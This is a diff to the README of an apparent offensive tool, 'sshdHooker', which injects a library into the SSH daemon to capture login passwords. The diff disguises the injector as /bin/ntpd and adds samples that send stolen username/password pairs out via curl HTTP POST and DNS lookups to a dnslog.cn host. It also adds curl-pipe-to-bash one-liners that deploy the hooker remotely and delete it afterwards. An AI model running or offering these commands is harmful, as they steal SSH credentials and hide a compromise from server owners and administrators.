@@ -21,8 +21,9 @@ Login with ssh password after running，The password record address is /tmp/.pas
 
 Other parameters:
 ```
-    -e   custom so file path，default is /tmp/hello.so
-    -o   custom injector path，default is /tmp/.i.
+    -s   Manually specify the sshd process id to be injected (usually it will be obtained automatically)
+    -e   custom so file path，default is /tmp/.g.so
+    -o   custom injector path，default is /bin/ntpd
     -m   change mode,defulat is 0, mode is 0 is to output to the file，output path is /tmp/.password.txt ，mode is 1 is to command execution mode
     -p   change payload，defsult is /tmp/.password.txt,if mode is 1，then use snsprintf to format the command and execute,Make sure the command contains both %s for format username and password
     -d   anto delete,If the value is anyone, any password is captured and deleted.Otherwise, it will be deleted after matching the entered username.
@@ -30,9 +31,9 @@ Other parameters:
 ```
 ## samples
 
-https send password
+http send password
 ```
-bash install.sh -p "curl -X POST -d 'username=%s\&password=%s' http://127.0.0.1" -m 1
+bash install.sh -p "curl -X POST -d 'username=%s\&password=%s' --connect-timeout 1 -m 1 http://127.0.0.1" -m 1
 ```
 
 dns send password and self-delete (Please make sure that your command is not blocked, because the actual use of this program is that the system is an online program, if the command is blocked, it will cause the ssh login program to be blocked)
@@ -42,7 +43,12 @@ bash install.sh -p 'ping `echo %s-%s|xxd -ps`.k9lovy.dnslog.cn -c 1' -m 1 -d any
 
 Fast remote automatic deployment and self-delete for If any user login succeeds
 ```
-curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.2/sshdHooker.sh | bash -s -- -d anyone
+curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.4/sshdHooker.sh | bash -s -- -d anyone
+```
+
+Fast remote automatic deployment and used by http send password and self-delete for If any user login succeeds (*Recommend*)
+```
+curl -L https://github.com/9bie/sshdHooker/releases/download/1.0.4/sshdHooker.sh | bash -s -- -p "curl -X POST -d 'username=%s\&password=%s' --connect-timeout 1 -m 1 http://127.0.0.1" -m 1 -d anyone
 ```
 
 ## debug
